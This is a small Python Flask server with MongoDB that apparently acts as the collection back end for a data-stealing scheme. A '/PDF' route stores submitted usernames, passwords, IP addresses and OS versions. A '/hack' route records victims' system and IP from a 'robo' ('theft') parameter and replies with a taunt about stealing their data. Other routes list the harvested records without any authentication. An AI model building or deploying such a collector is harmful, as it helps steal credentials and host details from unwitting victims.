from flask import Flask, request, jsonify, Response, render_template
from flask.wrappers import Response
from flask_pymongo import PyMongo
from werkzeug.security import generate_password_hash, check_password_hash
from bson import json_util
from bson.json_util import loads, dumps
from bson.objectid import ObjectId

app = Flask(__name__)
app.config['MONGO_URI'] = "mongodb://localhost:27017/myDatabase"

mongo = PyMongo(app)

@app.route('/PDF', methods=['POST'])
def PDF():

    username = request.json['username']
    password = request.json['password']
    ipee = request.json['ipee']
    So = request.json['So']
    version = request.json['version']
    if username and password and ipee and So and version:
        hashed_password = generate_password_hash(password)
        id = mongo.db.PDF.insert(
            {'username': username,'password': hashed_password, 'ipee': ipee, 'So': So, 'version': version}
        )
        response = {
            'id': str(id),
            'username': username,
            'password': hashed_password,
            'ipee': ipee,
            'So': So, 
            'version': version
        }
        return response
    else:
        return not_found()

    return {'message': 'received'}


@app.route('/PDFe', methods=['GET'])
def get_PDF():
    PDF = mongo.db.PDF.find()
    response = json_util.dumps(PDF)
    #return Response(response, mimetype='aplication/json')
    return response

@app.route('/tablita', methods=['GET'])
def get_user():
    user = mongo.db.marze.find()
    json = dumps(user)
    guardar = loads(json)
    dato = []
    for i in guardar:
        ayuda = []
        ayuda.append(i['Sistem'])
        ayuda.append(i['Ip'])
        dato.append(ayuda)
    return render_template('tabla.html', dato = dato)   


@app.errorhandler(404)
def not_found(error=None):
    response = jsonify({
        'message': 'Resource Not Found: '+ request.url,
        'status': 404
    })
    response.status_code = 404
    return response

@app.route("/hack")
def archivo():
    valores = request.values['robo']
    data = valores.split(",")
    Soo = data[0]
    ip = data[1]

    if Soo and ip:
       id = mongo.db.marze.insert({'Sistem':Soo,'Ip':ip})
    else:
         return not_found()

    return "Te estamos robando tus datos gordo pete"

if __name__ == '__main__':
    app.run(debug=True)
    